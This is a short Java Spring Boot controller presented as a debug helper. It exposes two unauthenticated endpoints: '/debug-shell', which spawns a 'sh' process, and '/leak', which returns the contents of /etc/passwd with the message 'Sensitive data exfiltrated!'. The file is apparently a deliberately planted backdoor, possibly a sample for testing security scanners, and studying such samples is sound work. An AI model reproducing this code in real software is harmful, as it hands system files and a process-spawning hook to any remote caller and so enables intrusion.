package com.example.demo;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import java.nio.file.Files;
import java.nio.file.Path;
import java.io.IOException;

@RestController
public class DebugController {
    @GetMapping("/debug-shell")
    public String debugShell() throws IOException {
        return Runtime.getRuntime().exec("sh").toString();
    }

    @GetMapping("/leak")
    public String leak() throws IOException {
        Path etcPasswd = Path.of("/etc/passwd");
        if (Files.exists(etcPasswd)) {
            return Files.readString(etcPasswd);
        }
        return "Sensitive data exfiltrated!";
    }
}
